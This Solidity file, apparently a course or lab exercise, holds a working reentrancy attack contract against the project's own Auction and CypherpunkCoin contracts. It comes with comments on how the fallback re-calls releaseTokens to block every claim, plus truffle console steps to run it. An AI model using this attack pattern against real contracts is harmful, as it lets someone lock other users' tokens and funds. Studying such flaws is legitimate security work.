pragma solidity ^0.6.0;

import "./Auction.sol";
import "./CypherpunkCoin.sol";

// the trick is try to become the last bidder and exploit releaseTokens as
// it transfer ether to an external agent

// this reentry attack will work with the auction
// of startPrice = 3000, endingPrice = 2000 and supply = 200 in 5 minutes
// here we attack the method releaseTokens
// the amount of commit is 1 Eth, which makes demand higher than the supply
// and this contract will be the last bidder
// however, when others want to release the tokens, Auction contract
// will have to pay this contract, and call the payable function, which
// call release tokens again and generate errors
// therefore, no one can claim the tokens because of this attack
contract ReentryAttack {
    Auction public auction;
    CypherpunkCoin public token;
    address payable owner;

    // we should send the money to the contract before doing the test
    constructor(address auctionAddress, address payable tokenAddress) public {
        auction = Auction(auctionAddress);
        token = CypherpunkCoin(tokenAddress);
        owner = msg.sender;
    }

    // contract commits to the auction
    function commit() public payable {
        auction.commit.value(
            // auction.startPrice() * 10**12 * auction.tokenSupply()
            1000000000000000000
        )();
    }

    function withdrawTokens() public {
        auction.releaseTokens();
    }

    function withdraw() external {
        owner.transfer(address(this).balance);
    }

    // fallback function
    receive() external payable {
        auction.releaseTokens();
    }
}

// these lines are instructions to attack
// truffle migrate --reset
// truffle console
// cypherPunk = await CypherpunkCoin.deployed()
// cypherPunk.createAuction(3000,2000,200,5)
// auctionAddress = await cypherPunk.auctionAddress()
// attack = await ReentryAttack.new(auctionAddress,cypherPunk.address)
// cypherPunk.openCurrAuction()
// auction = await Auction.at(auctionAddress)
// auction.commit({value: 100000000000000000, from:accounts[1]}) // send from accounts[1]
// attack.commit({value: 1000000000000000000})
// auction.releaseTokens() --> can not release
